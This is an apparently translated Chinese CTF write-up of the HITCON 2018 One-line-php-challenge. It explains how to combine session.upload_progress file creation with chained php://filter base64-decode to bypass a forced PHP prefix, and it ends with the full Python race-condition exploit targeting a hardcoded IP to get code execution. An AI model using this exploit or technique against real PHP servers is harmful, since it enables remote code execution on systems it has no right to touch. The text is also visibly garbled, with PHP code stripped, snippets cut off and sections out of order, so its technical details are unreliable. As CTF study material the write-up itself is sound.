# 关于One-line-php-challenge的思考
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0X01 前言：
hitcon 2018 过去了，作为一个 web 手 one-line-php-challenge
这道题自然引起了我的很大的兴趣，后期看各路大师傅们的解题姿势，也都是之前说过的一些细小的知识，看看为什么没有利用起来
## 0X02 题目介绍：
    P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04
不愧是 Orange 巨巨的题，真的惊了。
大概解释一下就是 我们要通过 get 方式传入一个 orange 参数，作为文件名，然后程序会将我们传入文件名的那个文件取出头6个字符和 @
          value="K0rz3n" />
upload.php
实验一：无PHPSESSID的情况
实验二：有PHPSESSID的情况
实验三：只有PHPSESSID的情况
这次实验中我修改了 tt.php 中的部分内容，他看起来是下面的样子
我将不让 POST 请求中带有我们的 session.upload_progress.name
我们发现，如果我们的请求头中带着 session.upload_progress.name 的值，不管服务端PHP有没有开session ，  
只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个 PHPSESSID 在session
文件的默认存放位置生成一个 session 文件
### 第二步：再分析已知条件
好了，到现在为止我们再回过头看题目，根据我们上面的分析，是不是我们只要和原来的 session.upload_progress getshell
一样，向题目页面一边 POST 数据，然后再一边 GET 请求这个 session 文件就行了呢？我们发现事情并没有我们想的那么简单，我们发现 Orange
给我们做了一个非常苛刻的限制，这其实也是这道题的第二个难点，他要求文件的开头必须是 @
是对三个白帽的一道题的分析
我们先简单的回顾一下
题目内容是这样的：
    ';
    $content .= $_POST['txt'];
    file_put_contents($_POST['filename'], $content);
大致意思是，我们可以在服务器上写文件，但是代码设置为只要我们传入文件的内容，他就给我们在开头添加上 ，众所周知，这段代码的意思就是我们直接退出，不继续执行，因此就算我们传入了一句话，也会因为开头的这个退出指令导致我们无法包含，于是我们就要想办法绕过这个
“死亡” exit
P 总在文中给出了两种方法，一种是通过 php://filter 的 base64-decode 过滤器实现的，我们先简单看一下这个方法
#### 方法一：convert.base64-decode
这种方法涉及到了 php 进行 base64 解码的一种机制，他在解码的时候遇到不符合 base64 规定字符的就会将其忽略，实际上他的解码过程是这样的
     ，在排除掉  、? 、；、空格以后，真正参与解码的只有 phpexit
这七个字符，又因为，base64 解码是 4byte 一组，于是我们给他添加一个字符让他凑够 8
测试代码：
    ";
        echo $new_data;
        $data = $new_data;
    }
输出结果：
有一部分被解析了，我们看一下源码
可以看到我们成功恢复了我们的payload (前面是上一次循环的，第三次循环只剩下了题目要求的字符)
下面给上 Orange 的 exp
    import sys
    import string
    import requests
    from base64 import b64encode
    from random import sample, randint
    from multiprocessing.dummy import Pool as ThreadPool
    HOST = 'http://54.250.246.238/'
    sess_name = 'iamorange'
    headers = {
        'Connection': 'close', 
        'Cookie': 'PHPSESSID=' + sess_name
    }
    payload = '@'
    while 1:
        junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
        x = b64encode(payload + junk)
        xx = b64encode(b64encode(payload + junk))
        xxx = b64encode(b64encode(b64encode(payload + junk)))
        if '=' not in x and '=' not in xx and '=' not in xxx:
            print xxx
            break
    def runner1(i):
        data = {
            'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + xxx + 'Z'
        }
        while 1:
            fp = open('/etc/passwd', 'rb')
            r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
            fp.close()
    def runner2(i):
        filename = '/var/lib/php/sessions/sess_' + sess_name
        filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
        # print filename
        while 1:
            url = '%s?orange=%s' % (HOST, filename)
            r = requests.get(url, headers=headers)
            c = r.content
            if c and 'orange' not in c:
                print
    if sys.argv[1] == '1':
        runner = runner1
    else:
        runner = runner2
    pool = ThreadPool(32)
    result = pool.map_async( runner, range(32) ).get(0xffff)
## 0X04 总结：
这篇文章在看了 wonderkun 师傅的分析后又简单的跟着 Orange
的提供的思路走了一遍题目的流程，没有新的技术，但是更多的是技术的细节，session.upload_progress
这个小细节之前我也没有想到过，很多的细节就在想当然中过去了，如果你深入挖掘一下，可能会有不一样的收获
## 0X05 参考：